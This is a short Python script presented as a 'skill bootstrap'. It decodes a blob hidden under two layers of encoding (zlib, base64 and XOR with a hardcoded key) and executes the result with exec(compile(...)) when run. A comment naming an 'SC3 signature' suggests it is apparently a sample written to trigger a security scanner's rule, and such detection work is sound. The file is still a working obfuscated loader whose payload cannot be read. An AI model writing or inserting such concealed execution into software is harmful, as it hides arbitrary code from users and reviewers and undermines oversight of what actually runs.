#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU8u2ojoU/KAMAEHEQQ/UAzYoElAeOjO8wkMgJDzC17fHs/reO7jDvVbVTu2qCspvU+O/pu2dKTHClSlB4aU7K9o+hLMllmhK7UI6NWM3b9M+Kc/6UyzFgvVK8kZ2uaUPfRlcS2Z2IhSk4SyhmeMyF829hgS8OG44vZZDz9Y1QKmNYX3YvvSCDfe5QJbUQJFwrpOyb41tMvrY0osRi8UK9PX0FLSzJ5N4aEIbMHeGSBzSXSTx/Veh2dUGbrAI62wqaodu77PwRMl8MY4ylm4zoA+AgD3ASl1hAzFy78pkeGvOya6RhtVwN6QY7kYYLIKEw9e41kCcWsx0IybhZQHOxblp1tf+dTjyXVZogz3DTYyR9KT5Pm1GRqsTuSsovKYkGvbqM+kz5k5mBFDrDnZJpipij93XkSedvIqKp5H6iXX/HZIzk5sJUIo++9yU5pIzMOpp2bgeHf8wF8EVj2q9jaGXm24WTLcvc2xnGWq4NaVnXwTPAb/viWHVPfZCwPd9AWg737bmkkyh9qpD2rd4MdD3/pA2QcGJ+eDp4PG7lBKMz7nWfvNr6axnwhygQr3EIBUs+V4N5O3XGrQzT4QcP/NMmGaSvBBLfRQT5GbK5BEA/sv3ykG0qx9/3Ej40fN3DmlugIExz0CpVd3dUHvPmCZelI2Mn3ZLoNRqM9q1k4w1d/zrgo9h2a+ldQIt5eEutYI/+zjUEj2bBaHGESWPbm3Dh+j4q+lVO8qoSM43HhbC531CK/rG544vy7y6sa3VFckG5853P8Sib81ZcuFcXQy0nbxr03b1FGcXEVYHNu2h+dEP4hH6V/bu92premoqrJdHEIJXDWjftfQKAvG0a4TSP/XkITkxnLRjkJLS+z9+t45HXD+8cJInQdbAT5+civf5njDSzsIFxOzdB8AxLIZ1O6eZtvGmf/18z6NTp6vGEAhGtR4ls27sIpHvi5TZVPnJO9L4kfxWt/acwS01q9/CardwlVaaibKKbybV6+9NEN7kGk8482Av79vqVmdyjt3zJz8jnP/RG0QL3xG2uYj1pRPPJ/+w5kZaUiVeX4j4gz+GPbO6+p0n06sne/8/8vc+veLzS1RL1gZONliS5atq5Z170bkoKUpSvRoADkCC44qafVzqDeFF4FCM7ov1ED99wsHQM1tXDPfXrz/ZtKJi"
_K = bytes.fromhex("4d25dfe83ac2dae9111f9701")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
